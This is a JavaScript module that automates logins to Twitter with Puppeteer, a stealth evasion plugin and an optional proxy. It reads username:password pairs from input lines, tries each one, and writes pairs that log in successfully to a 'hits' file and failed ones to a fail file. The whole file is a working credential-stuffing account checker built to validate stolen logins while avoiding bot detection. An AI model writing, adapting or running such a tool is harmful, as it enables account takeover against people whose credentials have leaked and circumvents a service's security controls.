require('dotenv').config()
const puppeteer = require('puppeteer-extra')
const {executablePath} = require('puppeteer')
const fs        = require('fs')

// add stealth plugin and use defaults (all evasion techniques)
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin());

const USE_PROXY      = process.env.USE_PROXY
const TWT_LOGIN      = process.env.TWT_LOGIN
const TWT_HOME       = process.env.TWT_HOME
const TWT_CHALLENGE  = process.env.TWT_CHALLENGE
const USR_TAG        = process.env.USR_TAG
const NEXT_TAG       = process.env.NEXT_TAG
const PSW_TAG        = process.env.PSW_TAG
const LGN_TAG        = process.env.LGN_TAG
const OUT_FILE       = process.env.OUT_FILE
const FAIL_FILE      = process.env.FAIL_FILE;
const DELAY_TIME     = 5000

const Helper = {
    delay: function (time) {
        return new Promise(function(resolve) { 
            setTimeout(resolve, time)
        });
    },
    processLine: async function (line, lap){
        lap++
        console.log(`resolver start function - ${lap}`)
        const start = new Date();
        let errorTail = ``

        let usr = {
            userName: '',
            password: ''
        }
        let spl = line.split(':')

        usr.userName = spl[0]
        usr.password = spl[1]

        // open our lovely browser
        const browser = await puppeteer.launch({
            headless: true,
            slowMo: 250,
            args: [USE_PROXY ? `--proxy-server=http=${USE_PROXY}` : '', '--no-sandbox', '--disable-setuid-sandbox'],
            executablePath: executablePath()
        });

        try {
            
            const page = await browser.newPage();
            // open twitter
            await page.goto(TWT_LOGIN, {waitUntil: 'networkidle2'})
            await this.delay(DELAY_TIME)
            // Focus and fast send characters - username
            await page.focus(USR_TAG)
            await page.keyboard.sendCharacter(usr.userName)
            // Next step of flow
            await page.click(NEXT_TAG)
            await this.delay(DELAY_TIME)
            // Focus and fast send characters - password
            await page.focus(PSW_TAG)
            await page.keyboard.sendCharacter(usr.password)
            await this.delay(DELAY_TIME)
            // Login action
            await page.click(LGN_TAG)
            await this.delay(DELAY_TIME)
            // Check url if it's OK or not
            const url = await page.evaluate(() => document.location.href);
            // Success
            if(url == TWT_HOME || url == TWT_CHALLENGE){
                // Save hit
                fs.appendFileSync(OUT_FILE, `${line}\n`);
            } else if (url == TWT_LOGIN){
                // Fail accounts
                fs.appendFileSync(FAIL_FILE, `${line}\n`);
            }
            // To-Do add verified accounts check
            console.log("url type :: ", url)
            // Each line in input.txt will be successively available here as `line`.
        } catch (e){
            errorTail += `Error: ${e} \n`
        }

        const end = new Date()
        console.log()

        // Close browser - we do not waste our ram
        await browser.close();

        return new Promise(resolve => {
            setTimeout(() => {
                resolve({
                    end: `Lap ${lap} :: time estimated finish ${end - start} ms`,
                    tail: errorTail
                })
            }, 10)
        })
    }
}
module.exports = Helper